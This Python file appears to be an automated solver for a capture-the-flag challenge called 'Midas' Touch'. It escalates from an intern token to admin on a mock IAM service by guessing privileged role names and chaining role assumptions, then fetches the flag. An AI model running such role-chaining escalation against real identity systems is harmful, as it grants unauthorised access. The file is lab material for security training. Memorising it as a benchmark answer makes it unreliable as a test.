"""Midas' Touch: IAM Role Assumption Chain solver."""
from flag_utils import extract_flag
import requests

class MidasSolver:
    """Chain role assumptions to reach admin role."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        1. POST /start to get intern token
        2. GET /whoami and /roles to explore
        3. Chain role assumptions to reach admin
        4. GET /flag with admin token
        """
        print("=== Midas' Touch: IAM Role Assumption ===", flush=True)

        try:
            # Step 1: Get intern token
            start_resp = requests.post(f"{self.base_url}/start", timeout=10)
            print(f"Start status: {start_resp.status_code}", flush=True)
            print(f"Start response: {start_resp.text[:500]}", flush=True)

            if start_resp.status_code != 200:
                print("Failed to start", flush=True)
                return None

            start_data = start_resp.json()
            current_token = start_data.get("token") or start_data.get("bearer_token")
            print(f"Initial token: {current_token[:30]}...", flush=True)

            # Step 2: Explore roles
            headers = {"Authorization": f"Bearer {current_token}"}

            whoami_resp = requests.get(f"{self.base_url}/whoami", headers=headers, timeout=10)
            print(f"Whoami: {whoami_resp.text[:500]}", flush=True)

            roles_resp = requests.get(f"{self.base_url}/roles", headers=headers, timeout=10)
            print(f"Roles: {roles_resp.text[:1000]}", flush=True)

            # Parse available roles
            roles_data = roles_resp.json()
            if isinstance(roles_data, list):
                available_roles = roles_data
            elif isinstance(roles_data, dict) and "roles" in roles_data:
                available_roles = roles_data["roles"]
            else:
                available_roles = []

            print(f"Available roles: {available_roles}", flush=True)

            # Step 3: Build trust graph by trying assumptions
            # Common role names that might be in chain
            target_roles = [
                "admin",
                "root",
                "superuser",
                "manager",
                "developer",
                "engineer",
                "power-user",
                "senior",
            ]

            # First try direct assumption to each target
            for role_name in target_roles:
                if isinstance(available_roles, list) and role_name not in [str(r) for r in available_roles]:
                    continue

                try:
                    assume_resp = requests.post(
                        f"{self.base_url}/assume",
                        headers=headers,
                        json={"role": role_name},
                        timeout=10
                    )
                    print(f"Assume {role_name}: {assume_resp.status_code}", flush=True)
                    print(f"  Response: {assume_resp.text[:300]}", flush=True)

                    if assume_resp.status_code == 200:
                        # Got new token
                        new_data = assume_resp.json()
                        new_token = new_data.get("token") or new_data.get("bearer_token")
                        if new_token:
                            # Try to get flag
                            flag_resp = requests.get(
                                f"{self.base_url}/flag",
                                headers={"Authorization": f"Bearer {new_token}"},
                                timeout=10
                            )
                            print(f"Flag attempt: {flag_resp.status_code}", flush=True)
                            print(f"  Response: {flag_resp.text[:300]}", flush=True)

                            flag = extract_flag(flag_resp.text)
                            if flag:
                                    return flag

                            # Not admin yet, keep this token and try further
                            current_token = new_token
                            headers = {"Authorization": f"Bearer {current_token}"}

                except Exception as e:
                    print(f"  Error assuming {role_name}: {e}", flush=True)

            # Step 4: Try multi-hop chain
            # Common chains: intern -> developer -> admin
            chains = [
                ["developer", "admin"],
                ["engineer", "admin"],
                ["manager", "admin"],
                ["developer", "manager", "admin"],
                ["engineer", "senior", "admin"],
            ]

            for chain in chains:
                print(f"Trying chain: {chain}", flush=True)
                chain_token = current_token
                chain_headers = {"Authorization": f"Bearer {chain_token}"}

                for role in chain:
                    try:
                        assume_resp = requests.post(
                            f"{self.base_url}/assume",
                            headers=chain_headers,
                            json={"role": role},
                            timeout=10
                        )
                        if assume_resp.status_code == 200:
                            new_data = assume_resp.json()
                            chain_token = new_data.get("token") or new_data.get("bearer_token")
                            chain_headers = {"Authorization": f"Bearer {chain_token}"}
                            print(f"  Assumed {role} successfully", flush=True)
                        else:
                            print(f"  Failed to assume {role}", flush=True)
                            break
                    except Exception as e:
                        print(f"  Error in chain at {role}: {e}", flush=True)
                        break

                # Try flag with final token in chain
                try:
                    flag_resp = requests.get(
                        f"{self.base_url}/flag",
                        headers=chain_headers,
                        timeout=10
                    )
                    flag = extract_flag(flag_resp.text)
                    if flag:
                            return flag
                except Exception as e:
                    print(f"  Error getting flag: {e}", flush=True)

        except Exception as e:
            print(f"Error: {e}", flush=True)
            import traceback
            traceback.print_exc()

        print("Failed to reach admin role", flush=True)
        return None
